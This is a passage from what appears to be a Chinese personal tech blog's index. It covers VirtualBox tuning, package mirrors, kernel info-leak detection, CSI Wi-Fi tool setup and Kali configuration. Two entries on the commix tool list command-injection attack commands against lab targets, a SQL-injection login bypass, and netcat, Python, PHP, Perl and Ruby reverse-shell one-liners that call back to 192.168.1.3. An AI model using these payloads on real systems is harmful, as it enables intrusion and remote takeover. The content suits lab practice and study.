      <content type="text"><![CDATA[怎么可以让你的虚拟机运行的更快呢？ 1、开启CPU的硬件虚拟化功能现在的CPU几乎都支持硬件虚拟化功能，英特尔称之为VT-x技术，AMD称之为AMD-V技术。在百度搜索你的笔记本型号或主板型号+开启虚拟化，就可以找到相应的开启方法。一般是开机进入bios，然后找到虚拟化技术的选项，将disabled改为enabled。据我所知，用英特尔CPU的电脑，虚拟化技术的选项名称大概含有“virtualization technology”的字眼。 BIOS开启成功后，在虚拟机的设置中，启用硬件加速。 当你成功开启硬件虚拟化功能时，虚拟机的窗口右下角有一个蓝色V的图标，鼠标移上去就会提示成功开启。 2、给虚拟机分配足够的内存既然本机有4GB的内存，那么可以分配1GB供虚拟机上的Ubuntu使用。内存大小根据虚拟机系统的需要来定，如果你跑XP，那么分配512MB已经很足够了。 3、开启3D加速，分配足够显存笔者觉得当初Ubuntu界面卡顿很有可能跟显卡方面的设置有关。于是开启了3D加速，分配了32MB的显存给VirtualBox。性能提升很明显。 4、安装VirtualBox增强功能启动虚拟机。单击虚拟机菜单中的“设备”&gt;“安装增强功能”，也可以按快捷键Host+D。Host键就是虚拟机窗口右下方显示的键，默认为Right Ctrl，即右边的Ctrl键。然后系统会加载增强功能所在的虚拟光盘。点击运行，按提示完成安装，重启虚拟机。 5、电脑的核心都挺多的多分个核就好了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[gem更换国内源]]></title>
      <url>%2F2017%2F01%2F22%2Fgem%E6%9B%B4%E6%8D%A2%E5%9B%BD%E5%86%85%E6%BA%90%2F</url>
      <content type="text"><![CDATA[12345678910111213gem sources -l#移除https://rubygems.org源gem sources --remove https://rubygems.org/#增加https://gems.ruby-china.org/源gem sources -a https://gems.ruby-china.org/#更新缓存gem sources -u]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[替换homebrew默认源]]></title>
      <url>%2F2017%2F01%2F22%2F%E6%9B%BF%E6%8D%A2homebrew%E9%BB%98%E8%AE%A4%E6%BA%90%2F</url>
      <content type="text"><![CDATA[网上搜的好多都不能用了，但是这个是可以的。 12cd &quot;$(brew --repo)&quot;git remote set-url origin git://mirrors.ustc.edu.cn/brew.git]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Linux内核info leak漏洞]]></title>
      <url>%2F2017%2F01%2F22%2FLinux%E5%86%85%E6%A0%B8info-leak%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[摘要: 介绍一种Linux内核的信息泄漏漏洞检测方法。没什么内容，语义分析，可以集成在Coverity等静态扫描工具中。 1 Information Leak漏洞风险从应用层软件，到hypervisor再到kernel代码，都存在Information Leak的风险。下面给出一些示例： 应用层软件：通常是应用敏感数据泄漏，比如从远程客户端获取服务端敏感数据。CVE-2012-0053，Openssl的心脏滴血等。 Hypervisor：主要是向guest泄漏hypervisor数据。CVE-2010-4525. Kernel代码：泄漏内核地址，空间布局等，如CVE-2013-2147. 这里主要分析内核中的Information Leak漏洞所带来的风险。内核中的Information Leak通常都是用来绕过内核中的保护机制（利用缓解：StackGuard, ASLR），由于本身并不能直接用来形成提权等高风险操作，因此Information Leak漏洞经常被人忽视。 先来看一下这些保护机制。 StackGuard. StackGuard是一种编译器实现的保护技术，它在栈函数返回地址前插入一个“canary”，当发生溢出“canary”值被破坏，将触发系统的异常处理流程。它的安全性依赖于“canary”的保密，也就是“canary”不能被攻击者预测或取到。 ASLR. ASLR技术是将进程等的加载地址随机化，它的安全性依赖于加载基地址的不可预测，使exploit不能精确进行地址覆盖。 无论“canary”还是ASLR的基地址，对攻击者来说都是“秘密”。也就是在没有Information Leak漏洞前提下，这些都是用户不可直接获取的。但Information Leak漏洞可以辅助攻击者获取到这些“秘密”，进而绕过内核中的保护机制，成功实现漏洞利用。 2 Information Leak漏洞分类根据漏洞成因，可以对Information Leak漏洞进行分类。这里同样只关注内核中的情况。 字节对齐带来的内存“空洞”. 为了程序性能，编译器在编译代码时会对变量进行字节对齐，从而引入了一些内存“空洞”。比如结构体使用sizeof计算的大小一般会大于各个成员占用空间大小的和。当这些内核中的内存“空洞”没有被初始化（ABI没有规定函数退栈时要清理这些栈空间），通过copy_to_user等函数拷贝到用户空间时，就会造成Information Leak漏洞，泄漏内核栈中的数据，比如泄漏了一个栈上指针，就可以通过它来计算进程基址（stackjack攻击）。 缺少变量初始化. 内核函数中的本地变量声明后，默认不会被初始化。根据C99描述这块空间的内容是不确定的。实际上栈空间是被各函数复用的，因此未初始化变量的内容很可能保存的是上个函数栈上的数据。 缺少对用户读操作的检查. 当向用户空间拷贝数据时，没有做大小检查或者检查逻辑出现错误，都会导致Information Leak。这类漏洞通常称作“越界读”，它允许用户态读取不应该被访问的内核空间数据。 其它bug导致的infoleaks. 其它的Information Leak原因这里不做研究，但提一下。比如/proc/,/sys/和/boot/文件系统中也提供了内核符号地址，它们已经靠kptr_restrict机制保护，但也可能因为bug而绕过。另外系统缓存，日志等都有可能导致Information Leak. 上面说到Information Leak可能危害保证StackGuard和ASLR可靠基础的“秘密”，下面分析一下内核中的Information Leak确切会影响哪些数据。 Data段. 内核中的data段保存了编译时就确定的全局变量，data段的泄漏可能导致静态内核symbols的泄漏，比如某些用于配置的变量。 栈 内核栈是根据ABI约定，运行时分配的。里面包含了函数返回地址，栈指针和一些其它数据。比如函数调用的参数，StackGuard机制的“canary”等。另外如果没有实现栈地址随机化，还会泄漏栈布局。 堆 内核中的堆是由内存分配器管理，在需要的地方动态分配。这些堆分配器通常使用双向链表来管理这些堆内存。Information Leak会漏洞这些堆存储的内容，还有可能泄漏用于堆管理的结构数据。 3 栈的Information Leak漏洞检测技术分析目前的漏检测技术，发现通过数据流分析的方法，可以对Information Leak进行建模来进行漏洞检测。在模型里定义3个基本元素：数据源，数据接收方和传播路径。 我们可以对程序进行语义分析来匹配这套模型，从而识别漏洞。语义分析这个工作，选用开源的Coccinelle工具。 12345678910111213handler(...) &#123; &lt;... T ID; ... when != memset(&amp;ID, 0, ...) when != ID = ...* copy_to_user(EV, &amp;ID, EN) ...&gt;&#125; 1) 数据源：ID变量 2) 数据接收方：用户态指针EV 3) 传播路径：我们想确定ID的内容没有被初始化。因此限定条件，ID在copy_to_user前没有memset()或初始化操作 像其它基于数据流的静态检测技术类似，这种方法也存在缺陷。比如这种Information Leak检测方法假定漏洞发生在一个函数内的，因此这种方法覆盖不了多函数场景。但实际测试中，依然会发现很多Linux内核和三方Driver的Information Leak漏洞。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[linux-csi-tools部署记录]]></title>
      <url>%2F2017%2F01%2F21%2Flinux-csi-tools%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95%2F</url>
      <content type="text"><![CDATA[我采用old installation instruction 的方法，并对里面个别几个地方有所修改，以适应国内有墙的现状。参考了一部分这个博客。打开终端把代码复制到终端运行即可。 准备工作我安装了Ubuntu10.04 desktop-i386版，使用的是刻录光盘镜像的方法，大家也可以制作启动u盘或者用虚拟机安装到物理硬盘（我最喜欢的方式）。注意/home分区要留足够的空间（建议10gb以上），/分区也要足够大，建议5gb以上。其他部分很简单，按照安装包的指示一步步来就可以。因为要编译新内核，根目录空间不足的话会不成功。安装的时候注意几个问题，linux碎片化严重，用不受支持的linux发行版或版本会导致编译失败，非常令人头疼。而ubuntu lts版支持时间也不长，安装软件的话如果apt用不了可以试着去百度或launchpad找deb包。 到对方提供的github网址里面，下载源代码，到右栏可以找到download zip file，下载完毕之后解压放到～/下面，文件夹改名为linux-80211n-csitool（放到别的地方也可以，不过需要修改下面每一条引用它的代码），由于国内网络环境不好，文件过大，用git clone的话及其容易失败，其他的小文件没关系，大家自己解决vpn吧，到网上搜索linvpn应该可以用一阵子，不过ubuntu的vpn设置方面有几点需要注意，百度上面也有介绍。现在比较好用的解决网络问题的方案是lantern和hosts 1sudo gedit /etc/modprobe.d/blacklist.conf 把下面内容粘贴进去，保存。 12345# blacklist modules under active development blacklist iwldvm blacklist iwlwifi blacklist mac80211 blacklist cfg80211 该步骤是为了禁止wifi，这样做的目的是让安装驱动的时候不容易出问题 Install necessary packages on Ubuntu安装内核组件 1sudo apt-get -y install git-core kernel-package fakeroot build-essential ncurses-dev 它们是用来编译用户空间工具的库 1sudo apt-get -y install libnl-dev libssl-dev # Install some necessary libraries iw可以用来在命令行界面开启wifi的监控模式和开启40mhz信道。 1sudo apt-get -y install iw Download, configure, compile, and install our custom Linux kernel下载附加的工具 1git clone git://github.com/dhalperi/linux-80211n-csitool-supplementary.git 设置内核 123cd linux-80211n-csitool # Go into the kernel src directorymake oldconfig # Use our optimized kernel configmake menuconfig # Enable your system-specific hardware 编译内核 12345make -j3 bzImage modules # -j3 here is 3-way parallelism, try #cores+1sudo make install modules_install # INSTALLsudo mkinitramfs -o /boot/initrd.img-`cat include/config/kernel.release` \ `cat include/config/kernel.release` # create ramdisk used to bootsudo update-grub 我在这些步骤里面出现了编译错误的情况，原因是里面的一些头文件和源代码文件名大小写不一致，解决方法是想办法把它复制一下，然后改成大小写一致的文件名（原来的不要删掉） 在一篇csdn blog里面，有人还这么说，如果编译出错，可以试着按照这里来做（关于这一部分，先在窗口输入cat include/config/kernel.release（注意是在 linux-80211n-csitool目录下）获取版本号，一般为3.5.7-csitool。将上述指令改为：sudo mkinitramfs -o /boot/initrd.img-3.5.7-csitool 3.5.7-csitool （注意空格）即可。后续的指令中均要将‘cat include/config/kernel.release’改为3.5.7-csitool）然而这个方法并不好用 下面安装头文件，记录csi的软件需要用它来编译 12sudo mkdir /usr/src/linux-headers-`cat include/config/kernel.release`sudo cp -rf usr/include /usr/src/linux-headers-`cat include/config/kernel.release`/include 编译成功之后重启，就会进入修改过的内核 Install our custom firmware.1sudo gedit /etc/modprobe.d/blacklist.conf 这一步把blacklist iwlwifi删掉，否则无法连接wifi，删掉之后只能连接没密码的wifi。运行下面的 1234567#backup original firmware, good for referencesudo cp /lib/firmware/iwlwifi-5000-2.ucode /lib/firmware/iwlwifi-5000-2.ucode.origsudo mv /lib/firmware/iwlwifi-5000-2.ucode /lib/firmware/iwlwifi-5000-2.ucode.orig# copy ours in separately, keeping name for referencesudo cp iwlwifi-5000-2.ucode.sigcomm2010 /lib/firmware/# install ourssudo cp iwlwifi-5000-2.ucode.sigcomm2010 /lib/firmware/iwlwifi-5000-2.ucode 这一步也有点小问题，这里面的文件名可能是有些小问题，如果出错的话，把固件改名，复制到该文件夹里。我的电脑里面iwlwifi系列如下所示 12345iwlwifi-1000-3.ucode iwlwifi-5000-2.ucode.origiwlwifi-3945-2.ucode iwlwifi-5000-2.ucode.sigcomm2010iwlwifi-4965-2.ucode iwlwifi-5150-2.ucodeiwlwifi-5000-1.ucode.orig iwlwifi-6000-4.ucodeiwlwifi-5000-2.ucode Download and compile hostapAt the time of writing, hostap 0.7 is the stable version. 123456cd # Back out of the kernel treegit clone git://w1.fi/srv/git/hostap-07.git # Get the codecd hostap-07/hostapdcp &lt;hostap-dotconfig&gt; .config # Our hostap config from linux-80211n-csitool-supplementary/hostap-config-files/makecp &lt;hostapd.conf-test&gt; hostapd.conf # Install the vanilla hostap conf we provide 这一步没有问题，安装hostapd，把电脑当作access point，功能相当于无线路由器，也可以直接用路由器，省略这一步 Install the userspace logging utilityThe userspace netlink tool that logs CSI is located in the supplementary material git at linux-80211n-csitool-supplementary/netlink/. 123cd ~/linux-80211n-csitool-supplementary/netlink # We assume you install into your home directorymake # hopefully the make succeeds!# If not, figure out why it didn&apos;t compile. Did you install the Linux headers above? 编译hostap，实际上这个不编译也没关系，因为有路由器或者安桌手机就可以充当ap Let’s try it out!1234sudo modprobe iwlwifi # did it work? Do you see logs about iwlwifi in the dmesg?sudo iwlist scanning # 扫描ap，窗口中会出现可以扫描到的无线网络。sudo ~/hostap-07/hostapd/hostapd ~/hostap-07/hostapd/hostapd.conf# 是启动hostap，此时本机电脑作为ap（相当于路由器的功能）。此时无线网络若还处于连接状态就会出错 测试hostap时： 1sudo ~/hostap-07/hostapd/hostapd ~/hostap-07/hostapd/hostapd.conf 是启动hostap，此时本机电脑作为ap（相当于路由器的功能）。此时无线网络若还处于连接状态就会出错：所以执行该命令前必须将无线网络连接断开，此时作为路由功能开启(出现结果)： 123using interface wlan0 with hwaddr 00:21:6a:35:4f:00 and ssid &apos;csitool-test&apos;wlan0:STA 38:bc:1a:0d:69:9f IEEE 802.11:authenticatedwlan0:STA 38:bc:1a:0d:69:9f IEEE 802.11:associated(aid 1) 手机可以连上‘csitool-test’的网络，状态一直是正在获取ipMake sure to kill hostapd when you’re done. Then put 802.11n-enabled hostapd config file in place: 1cp &lt;hostapd.conf-real&gt; hostapd.conf # Install the real hostap conf we provide 采集csi数据部分（关闭本机电脑作为路由的功能，保证连无线网的功能即可，用另一台电脑开启hostapd作为ap）： 1234sudo rmmod iwlwifi mac80211 cfg80211 # remove the modulessudo modprobe iwlwifi connector_log=0x1 #load the modules and set userspace beamforming logging#first,associate and set up IP to an AP that will send you HT packets#需要用另外一台电脑作为ap并设置好IP地址，当前电脑连上那个ap 12cd ~/linux-80211n-csitool-supplementary/netlinksudo ./log_to_file tmp.dat #当前电脑相当于dp（探测点），log_to_file tmp.dat可以记录csi的值 再打开另一个终端（命令行窗口）ping ，ping所连ap的ip地址，ping多次过后便会有csi数据 1234sudo rmmod iwlwifi mac80211 cfg80211 sudo modprobe iwlwifi connector_log=0x1cd ~/wifil/netlinksudo ./log_to_file &lt;地址/文件名&gt; 最后，使用该软件的时候，现一行一行地把上面代码部分粘贴到terminal里面，再连接没密码的wifi，然后再打开另一个terminal，ping 该ap的ap地址就可以运行另外，安卓手机ping的ap地址是192.168.43.1用路由器的话设置成接入点模式。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Commix命令详解]]></title>
      <url>%2F2017%2F01%2F21%2FCommix%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%2F</url>
      <content type="text"><![CDATA[介绍项目地址：https://github.com/stasinopoulos/commix Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。 使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081选项： -v VERBOSE详细程度级别（0-1，默认值：0）。 --version 显示版本号并退出。 --output-dir=.. 设置自定义输出目录路径。 -s SESSION_FILE 从存储（.sqlite）文件加载会话。 --flush-session 刷新当前目标的会话文件。 --ignore-session 忽略存储在会话文件中的结果。 目标： -u URL，--url = URL 目标URL。 --url-reload 在命令执行后重新加载目标URL。 -l LOGFILE 解析来自HTTP代理日志文件的目标和数据。 --crawl = CRAWLDEPTH 从目标网址开始抓取网站（1-2，默认值：0）。 请求： --data=DATA 要通过POST发送的数据字符串。 --host=HOST HTTP主机头。 --referer=REFERER HTTP Referer标头。 --user-agent=AGENT HTTP用户代理头。 --random-agent 使用随机选择的HTTP User-Agent头。 --param-del=PDEL 设置分割参数值的字符。 --cookie=COOKIE HTTP Cookie头。 --cookie-del=CDEL 设置分割cookie值的字符。 --headers=HEADERS 额外标头（例如「Header1：Value1 \ nHeader2：Value2」）。 --proxy=PROXY 使用HTTP代理（例如“127.0.0.1:8080”）。 --tor 使用Tor网络。 --tor-port=... 设置Tor代理端口（默认值：8118）。 --auth-url=... 登录面板URL。 --auth-data =AUTH 登录参数和数据。 --auth-type =AUTH HTTP认证类型（例如“基本”或“摘要”）。 --auth-cred =AUTH HTTP身份验证凭据（例如“admin：admin”）。 --ignore-401 忽略HTTP错误401（未授权）。 --force-ssl 强制使用SSL / HTTPS。 枚举： 这些选项可用于枚举目标主机。 --all 检索一切。 --current-user 检索当前用户名。 --hostname 检索当前主机名。 --is-root 检查当前用户是否具有root权限。 --is-admin 检查当前用户是否具有管理员权限。 --sys-info 检索系统信息。 --users 检索系统用户。 --passwords 检索系统用户密码散列。 --privileges 检索系统用户权限。 --ps-version 检索PowerShell的版本号。 文件访问： 这些选项可用于访问目标主机上的文件。 --file-read = FILE .. 从目标主机读取文件。 --file-write = FIL .. 写入目标主机上的文件。 --file-upload = FI .. 在目标主机上上传文件。 --file-dest = FILE .. 写入和/或上传到的主机的绝对文件路径。 模块： 这些选项可用于增加检测和/或注射能力。 --icmp-exfil = IP_ ..&apos;ICMP exfiltration&apos;注入模块。 （例如&apos;ip_src = 192.168.178.1，ip_dst = 192.168.178.3&apos;）。 --dns-server = DNS ..“DNS exfiltration”注入模块。 （用于DNS筛选攻击的域名）。 --shellshock“炮弹”注射模块。 注射： 这些选项可用于指定要插入和输入的参数,提供定制注入有效负载。 -p TEST_PARAMETER 可测试参数。 --suffix = SUFFIX 注入有效负载后缀字符串。 --prefix = PREFIX 注入有效负载前缀字符串。 --technique = TECH 指定要使用的进样技术。 --maxlen = MAXLEN 设置与时间相关的最大输出长度,注射技术（默认：10000字符）。 --delay = DELAY 设置与时间相关的注入的自定义时间延迟术（默认：1秒）。 --tmp-path = TMP_P .. 设置Web服务器的临时目录的绝对路径。 --root-dir = SRV_R .. 设置Web服务器根目录的绝对路径。 --alter-shell = AL .. 使用另一个os-shell（例如&apos;Python&apos;）。 --os-cmd = OS_CMD 执行单个操作系统命令。 --os = OS 将后端操作系统强制为此值。 --tamper = TAMPER 使用给定脚本篡改注射数据。 检测： 这些选项可用于自定义检测阶段。 --level = LEVEL 要执行的测试级别（1-3，默认值：1）。 --skip-calc 在检测期间跳过数学计算 --dependencies 检查第三方（非内核）依赖关系。 --skip-waf 绕过启发式检测WAF / IPS / IDS保护。 例子1234567891011121314151617181920212223242526272829python commix.py –url=&quot;http://192.168.1.4/test/test.php?addr=INJECT_HERE” --os-cmd=&quot;nc -e /bin/sh 192.168.1.3 1234″Freebuf给出的一些用法（http://www.freebuf.com/sectool/64030.html）测试漏洞web应用Damnpython commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=INJECT_HERE&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;使用注入攻击Payload参数测试php-Charts 1.0python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE&quot; --prefix=&quot;//&quot; --suffix=&quot;&apos;&quot;使用特殊的头和HTTP代理测试OWASP Mutillidaepython commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=INJECT_HERE&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot;使用ICMP渗漏（exfiltration）技术测试Persistencesu -c &quot;python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;&quot; 配合一些反弹shell1. Python-reverse-shell: python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\”192.168.1.3\”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\”/bin/sh\”,\”-i\”]);’2. PHP-reverse-shell: php -r ‘\$sock=fsockopen(\”192.168.1.3\”,1234);exec(\”/bin/sh -i &lt;%263 &gt;%263 2&gt;%263\”);’3. Perl-reverse-shell: perl -e ‘use Socket;\$i=\”192.168.1.3\”;\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\”tcp\”));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,\”&gt;%26S\”);open(STDOUT,\”&gt;%26S\”);open(STDERR,\”&gt;%26S\”);exec(\”/bin/sh -i\”);&#125;;’4. Ruby-reverse-shell: ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(\”192.168.1.3\”,1234);while(cmd=c.gets);IO.popen(cmd,\”r\”)&#123;|io|c.print io.read&#125;end’]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[commix使用示例]]></title>
      <url>%2F2017%2F01%2F21%2Fcommix%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B%2F</url>
      <content type="text"><![CDATA[1. Exploiting Damn Vulnerable Web App:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=127.0.0.1&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot; 2. Exploiting php-Charts 1.0 using injection payload suffix &amp; prefix string:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=test&quot; --prefix=&quot;&apos;&quot; --suffix=&quot;//&quot; 3. Exploiting OWASP Mutillidae using extra headers and HTTP proxy:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=127.0.0.1&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot; 4. Exploiting Persistence using ICMP exfiltration technique:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot; 5. Exploiting Persistence using an alternative (python) shell:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --alter-shell=&quot;Python&quot; 6. Exploiting Kioptrix: Level 1.1 (#2):1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.2/pingit.php&quot; --data=&quot;ip=127.0.0.1E&amp;submit=submit&quot; --auth-url=&quot;http://192.168.178.2/index.php&quot; --auth-data=&quot;uname=admin&amp;psw=%27+OR+1%3D1--+-&amp;btnLogin=Login&quot; 7. Exploiting Kioptrix: 2014 (#5) using custom user-agent and specified injection technique:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.6:8080/phptax/drawimage.php?pfilez=127.0.0.1&amp;pdf=make&quot; --user-agent=&quot;Mozilla/4.0 Mozilla4_browser&quot; --technique=&quot;f&quot; --root-dir=&quot;/&quot; 8. Exploiting CVE-2014-6271/Shellshock:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.4/cgi-bin/status/&quot; --shellshock 9. Exploiting commix-testbed (cookie) using cookie-based injection:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/commix-testbed/scenarios/cookie/cookie(blind).php&quot; --cookie=&quot;addr=127.0.0.1&quot; 10. Exploiting commix-testbed (user-agent) using ua-based injection:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.4/commix-testbed/scenarios/user-agent/ua(blind).php&quot; --level=3 11. Exploiting commix-testbed (referer) using referer-based injection:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.4/commix-testbed/scenarios/referer/referer(classic).php&quot; --level=3 12. Exploiting Flick 2 using custom headers and base64 encoding option:1root@kali:~/commix# python commix.py --url=&quot;https://192.168.2.12/do/cmd/*&quot; --headers=&quot;X-UUID:commix\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF&quot; --base64 13. Exploiting commix-testbed (JSON-based) using JSON POST data:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.11/commix-testbed/scenarios/regular/POST/classic_json.php&quot; --data=&apos;&#123;&quot;addr&quot;:&quot;127.0.0.1&quot;,&quot;name&quot;:&quot;ancst&quot;&#125;&apos; 14. Exploiting SickOs 1.1 using shellshock module and HTTP proxy:1root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/cgi-bin/status&quot; --shellshock --proxy=&quot;192.168.2.8:3128&quot;`]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[基于CSI的移动目标侦测研究学习]]></title>
      <url>%2F2017%2F01%2F21%2F%E5%9F%BA%E4%BA%8ECSI%E7%9A%84%E7%A7%BB%E5%8A%A8%E7%9B%AE%E6%A0%87%E4%BE%A6%E6%B5%8B%E7%A0%94%E7%A9%B6%E5%AD%A6%E4%B9%A0%2F</url>
      <content type="text"><![CDATA[环境安装需要用到CSI tool，这是一个运行在Ubuntu上的利用Intel Wi-Fi Wireless Link 5300 802.11n来做分析的程序。这里可以使用作者网站中方法来安装，也可以下载清华的版本。清华的版本附带了安装说明书，参考说明书上的方法，安装即可。 需要注意的是，发射源路由器需要选择单天线支持802.11n的路由器，我使用的是TP-LINK TL-WR742N。 获取数据cd进入csitools文件夹，进入linux-80211n-csitool-supplementary/netlink，运行 1sudo ./log_to_file tmp.dat 打开另一个终端，运行 1ping 192.168.1.1 -i 0.2 netlink文件夹中的tmp.dat就是采集的原始数据。 读取数据使用Matlab读取数据，进入linux-80211n-csitool-supplementary/matlab文件夹，使用read_bf_file函数可以读取数据。 一个例子数据包里包含 123456789101112timestamp_low: 4 (In the sample trace, timestamp_low is invalid and always 4.)bfee_count: 72Nrx: 3Ntx: 1rssi_a: 33rssi_b: 37rssi_c: 41noise: -127agc: 38perm: [3 2 1]rate: 256csi: [1x3x30 double] timestamp_low 是时间戳 bfee_count 数据包数量 Nrx,Ntx 分别表示接收端和发送端的天线数量 rssi_a, rssi_b, rssi_c 每个天线的RSSI数据，单位dB， agc Automatic Gain Control perm NIC重排列后的顺序结果，代表RF链路的顺序 rate 发送包的rate csi CSI原始数据，是个Ntx×Nrx×30复数矩阵 主要提取出CSI数据和timestamp_low。 数据预处理为了避免相位的偏移的影响，需要将相位进行线性变换，参考论文，写出了以下Python代码: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from math import *import numpy as npimport copyN = 1000 # N为采集的数据包数量def complexDecoding(raw_data):“””将原始数据转化为Python可识别的复数这里使用了第一个天线的数据raw_data[0]第二根第三根天线数据下标分别为1, 2原始数据为a + bi, python为a + bj返回处理后的数据“””for n in range(N):for i in range(30): # 30 代表子载波数量，固定为30if raw_data[0][-1] == ‘i’:data.append(complex(raw_data[0][:-1]+‘j’))else:data.append(complex(raw_data[0]))return datadef getAP(data):“””根据复数计算振幅和相位“””amplitudes = [([] * 30) for i in range(N)]phases = [([] * 30) for i in range(N)]for m in range(N):for i in range(30):r = sqrt((data[i + m * 30].real) ** 2 + (data[i + m * 30].imag) ** 2)amplitudes[m].append(r)phases[m].append(np.angle(data[i + m * 30]))return (amplitudes, phases)def preprocessingPhase(phases):“””将相位进行线性变换index是 -28 到 28 根据 IEEE 802.11n 协议返回变换后的相位“””index = range(-28,0,2) + [-1, 1] + range(3,28, 2) + [28]for m in range(N):for l in range(10):clear = Truebase = 0tphases[m][0] = phases[m][0]for i in range(1, 30):if phases[m][i] – phases[m][i-1] &gt; pi:base += 1clear = Falseelif phases[m][i] – phases[m][i-1] &lt; -pi:base –= 1clear = Falsetphases[m][i] = phases[m][i] – 2 * pi * baseif clear == True:breakelse:for i in range(30):phases[m][i] = tphases[m][i] – (tphases[m][29] – tphases[m][0])* 1.0 /(28 – (-28)) * (index[i])– 1.0 / 30 * sum([tphases[m][j] for j in range(30)])return phases 参考论文 PADS Passive Detection of Moving Targets with Dynamic Speed using PHY Layer Information]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[kali linux 2016 使用指南(二)]]></title>
      <url>%2F2017%2F01%2F21%2Fkali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%BA%8C%2F</url>
      <content type="text"><![CDATA[虚拟机安装增强1.Kali 官方安装更新 /etc/apt/sources.list 你所添加的源，请确保是我在一中写的所有 然后在线安装增强功能 12345apt-get updateapt-get install -y virtualbox-guest-x11reboot 2.VirtualBox自带包安装123456789apt-get update &amp;&amp; apt-get install -y linux-headers-$(uname-r)cp /media/cd-rom/VBoxLinuxAdditions.run /root/chmod 755 /root/VBoxLinuxAdditions.runcd/root./VBoxLinuxAdditions.run 内核头有问题自己手动安装过程打开 http://http.kali.org/kali/pool/main/l/linux/ 下载对应自己内核版本的 linux-kbuild 12345678910111213wget http://http.kali.org/kali/pool/main/l/linux/linux-kbuild-4.6_4.6.4-1kali1_amd64.debdpkg -i linux-kbuild-4.6_4.6.4-1kali1_amd64.debwget http://http.kali.org/kali/pool/main/l/linux/linux-headers-4.6.0-kali1-common_4.6.4-1kali1_amd64.debwget http://http.kali.org/kali/pool/main/l/linux/http://http.kali.org/kali/pool/main/l/linux/linux-headers-4.6.0-kali1-amd64_4.6.4-1kali1_amd64.debdpkg -i linux-headers-4.6.0-kali1-common_4.6.4-1kali1_amd64.debdpkg -i linux-headers-4.6.0-kali1-amd64_4.6.4-1kali1_amd64.debapt-get -f install 开启SSH服务首先：编辑sshd_config文件 1vim /etc/ssh/sshd_config 其次：将sshd_config文件中的语句PermitRootLogin prohibit-password修改为： 1PermitRootLogin yes 再次：使用命令启动SSH服务: 123/etc/init.d/ssh start# 或者service ssh start 最后：设置系统开机自动启动SSH服务: 1update-rc.d ssh enable //系统自动启动SSH服务 mysql重置密码1、如果Linux中未安装MySQL，则需要下载安装，在安装的过程中会要求输入用户名密码，则无需重置，直接设置 2、MySQL设置UTF-8编码格式** 配置文件： 1root@kali:~# vim /etc/mysql/my.cnf 添加默认utf-8编码： 123456[client]default-character-set = utf8[mysqld]default-storage-engine = INNODBcharacter-set-server = utf8collation-server = utf8_general_ci 3、更新MySQL的用户名密码 首先查看MySQL是否运行，确保MySQL是stop状态，可以使用/etc/init.d/mysql stop停止运行 12root@kali:~# /etc/init.d/mysql status[info] MySQL is stopped.. 然后启动MySQL的server/daemon process 1root@kali:~# mysqld_safe –skip-grant-tables &amp; 使用root用户连接MySQL 12345678910root@kali:~# mysql -u rootWelcome to the 